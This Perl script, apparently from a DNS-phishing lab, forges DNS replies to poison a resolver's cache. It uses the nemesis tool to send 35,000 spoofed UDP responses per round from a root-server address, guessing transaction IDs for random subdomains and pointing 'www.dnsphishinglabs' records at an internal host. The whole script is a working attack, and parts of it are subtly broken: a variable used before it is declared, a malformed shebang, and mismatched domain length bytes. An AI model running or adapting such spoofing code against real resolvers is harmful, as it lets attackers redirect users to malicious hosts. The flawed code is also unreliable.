!/usr/bin/perl

use strict;
use warnings;
use IO::Handle qw( );

#Setup the command
my @cmd = ('nemesis', 'udp', '-S198.41.0.4', '-D10.1.3.100', '-x53', '-y33333', '-P-');

for(my $i = 0; $i < 10; $i++ ){
        #Generate a randon subdomain (as hex)
        my $sub = sprintf("%x", int(rand(26)+97));
        $sub = $sub.sprintf("%x", int(rand(26)+97));
        $sub = $sub.sprintf("%x", int(rand(26)+97));

        #Convert hex to ascii
        my $ascii = $sub;
        $ascii =~ s/([a-fA-F0-9]{2})/chr(hex $1)/eg;

        #Ping the generated domain
        system($pingCmd);
		my $pingCmd = "ping $ascii\.testdomain.test & > /dev/null 2>&1";

		#Generates 35,000 malicious DNS responses 
        for(my $j = 0; $j < 35000; $j++){
                #Generate a random DNS transaction ID
                my $dnsId = int(rand(65536));

                my $payload = pack('n H*',
						#Header
                        $dnsId,                 #ID (Generated above, packed here)
                        '8580'.                 #Reply code
                        '0001'.                 #Num questions
                        '0002'.                 #Num answers
                        '0000'.                 #Authority RRs
                        '0000'.                 #Additional RRs                      
						#Question
                        '03'.                   #3 characters is following
                        $sub.                   #subdomain (Generated and packed above)
                        '0f'.                   #0f characters is following
                        '74657374646f6d61696e'. #Domain
                        '03'.                   #3 characters is following
                        '636f6d'.               #Extension (63 6f 6d = com)
                        '00'.                   #Padding
                        '0001'.                 #Record type
                        '0001'.                 #Class
                        #Answer
                        'c00c'.                 #Answer (pointer to 00c offset)
                        '0001'.                 #Type
                        '0001'.                 #Class
                        '0003f480'.             #TTL
                        '0004'.                 #Addr length
                        '0a010396'.             #Addr
                        '03'.                   #3 chars follows for answer
                        '777777'.               #www
                        '0f'.                   #0f characters is following
                        '646e737068697368696e676c616273'. #Domain
                        '03'.                   #3 chars follow
                        '74657374'.             #test
                        #'00'.                  #Pading for 3 letter TLD
                        '0001'.                 #Type
                        '0001'.                 #class
                        '0003f480'.             #TTL
                        '0004'.                 #Addr length
                        '0a010396'              #Addr
                );
                open(my $pipe, '|-', @cmd) or die $!;
                binmode($pipe);
                print($pipe $payload);
                close($pipe);
        }
}